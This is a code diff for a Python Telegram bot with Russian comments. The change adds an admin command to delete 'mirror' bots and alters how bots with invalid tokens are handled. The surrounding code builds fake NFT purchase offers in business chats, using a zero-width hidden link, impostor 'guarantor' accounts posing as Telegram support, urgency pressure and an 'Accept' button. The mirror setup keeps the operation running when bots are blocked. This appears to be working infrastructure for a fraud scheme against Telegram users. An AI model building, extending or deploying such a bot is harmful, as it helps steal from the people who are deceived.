@@ -14,7 +14,6 @@ from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                            InlineKeyboardMarkup, BusinessConnection)
-# ИСПРАВЛЕНО: добавлен TelegramUnauthorizedError
 from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramUnauthorizedError
 from dotenv import load_dotenv
 
@@ -187,6 +186,7 @@ async def cmd_start(msg: Message):
             "/set_default @ник — сменить получателя\n"
             "/addkey — создать ключ\n"
             "/setbotmax [токен] — добавить зеркало\n"
+            "/delbot @username — удалить зеркало\n"
             "/restartbots — перезапустить всех ботов"
         )
         return
@@ -385,7 +385,6 @@ async def handle_business_message(msg: Message):
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
-    # Ссылка маскируется в невидимку. Текст идет сразу после неё.
     hidden_link = f'<a href="{nft_link}">&#8203;</a>'
 
     card_text = (
@@ -398,7 +397,7 @@ async def handle_business_message(msg: Message):
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
         f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f"{nft_link}" # Голая ссылка внизу для картинки
+        f"{nft_link}"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -509,6 +508,18 @@ async def cmd_setbotmax(msg: Message):
     except Exception as e:
         await msg.reply(f"❌ Ошибка: {e}")
 
+@router.message(F.text.regexp(r"^/delbot\s+@?(\w+)"))
+async def cmd_delbot(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    username = msg.text.replace("/delbot", "").strip().replace("@", "")
+    
+    with get_db() as conn:
+        res = conn.execute("DELETE FROM mirrors WHERE username=?", (username,))
+        if res.rowcount > 0:
+            await msg.reply(f"🗑 Зеркало <b>@{username}</b> удалено из базы. Напиши /restartbots.")
+        else:
+            await msg.reply(f"❌ Зеркало @{username} не найдено.")
+
 @router.message(Command("restartbots"))
 async def cmd_restartbots(msg: Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -516,7 +527,7 @@ async def cmd_restartbots(msg: Message):
     os._exit(0) 
 
 # ==========================================
-# ЗАПУСК ВСЕХ БОТОВ
+# ЗАПУСК ВСЕХ БОТОВ (БЕЗ КРАШЕЙ)
 # ==========================================
 async def main():
     log.info("Starting all bots...")
@@ -533,9 +544,7 @@ async def main():
             bots_to_start.append(m_bot)
             log.info(f"🚀 Загружено зеркало: @{m['username']}")
         except TelegramUnauthorizedError:
-            log.error(f"❌ Токен @{m['username']} недействителен. Удаляю из базы.")
-            with get_db() as conn:
-                conn.execute("DELETE FROM mirrors WHERE id=?", (m["id"],))
+            log.error(f"❌ Токен @{m['username']} недействителен. Пропускаю.")
         except Exception as e:
             log.error(f"Ошибка загрузки @{m['username']}: {e}")
 
